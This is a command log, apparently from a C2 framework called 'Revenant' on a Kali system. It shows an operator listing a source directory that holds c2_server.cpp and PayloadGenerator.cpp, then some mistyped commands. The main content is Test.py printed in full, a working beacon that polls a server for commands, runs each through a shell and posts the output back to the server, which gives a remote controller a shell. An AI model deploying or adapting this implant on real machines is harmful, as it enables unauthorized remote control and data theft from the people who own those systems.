Time										command										Status										Data
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 11:48:47							ls											SUCCESS										README.md
																																	requirments.sh
																																	src
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 11:48:53							cd src											SUCCESS										Changed directory to /home/kali/Revenant/Revenant/src
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 11:49:01							ls											SUCCESS										c2
																																	c2_server.cpp
																																	c2_utils.cpp
																																	cloudflared.log
																																	Dharineesh%20J.log
																																	kali.log
																																	PayloadGenerator.cpp
																																	Test.py
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 11:49:09							cat Test.py											SUCCESS										import requests
																																	import time
																																	import subprocess
																																	
																																	# Setup session for keep-alive
																																	session = requests.Session()
																																	
																																	while True:
																																	    try:
																																	        
																																	        req = session.get("http://127.0.0.1:8080/home")
																																	    except requests.exceptions.RequestException:
																																	        
																																	        continue
																																	
																																	    # Print server response
																																	    print("GET /home ->", req.status_code)
																																	    print("Command from server:", repr(req.text))
																																	
																																	    # Step 2: Run the command if not empty
																																	    command = req.text.strip()
																																	    if command:
																																	        try:
																																	            print("Running command:", command)
																																	            result = subprocess.run(command, shell=True, capture_output=True, text=True)
																																	
																																	            # Combine stdout and stderr
																																	            output = result.stdout + "\n" + result.stderr
																																	            print("Command output:\n", output)
																																	
																																	            # Step 3: Send result back to server
																																	            data = {
																																	                "Result": output
																																	            }
																																	
																																	            resp = session.post("http://127.0.0.1:8080/home2", data=data, timeout=0.1)
																																	            print("POST /home2 ->", resp.status_code)
																																	
																																	        except Exception as e:
																																	            print(f"Error running command: {e}")
																																	
																																	    # Small delay to avoid flooding the server
																																	    time.sleep(0.5)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 11:49:13							man											SUCCESS										What manual page do you want?
																																	For example, try 'man man'.
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 11:50:51							l											SUCCESS										bash: line 1: l: command not found
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 11:51:08							ls -la											SUCCESS										total 28
																																	drwxr-xr-x 4 kali kali 4096 Jul 30 13:49 .
																																	drwxr-xr-x 3 kali kali 4096 Jun 12 17:26 ..
																																	drwxr-xr-x 8 kali kali 4096 Jul 30 16:58 .git
																																	-rw-r--r-- 1 kali kali 5013 Jul 30 16:57 README.md
																																	-rw-r--r-- 1 kali kali  716 Jun 12 17:28 requirments.sh
																																	drwxr-xr-x 2 kali kali 4096 Jul 31 11:48 src
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 11:53:02							l											SUCCESS										bash: line 1: l: command not found
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 11:56:31							l											SUCCESS										bash: line 1: l: command not found
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 11:59:18							l											SUCCESS										bash: line 1: l: command not found
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 11:59:24							;l											SUCCESS										bash: -c: line 1: syntax error near unexpected token `;'
																																	bash: -c: line 1: `;l'
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 12:01:14							l											SUCCESS										bash: line 1: l: command not found
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2025-07-31 12:02:36							l											FAILED										
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
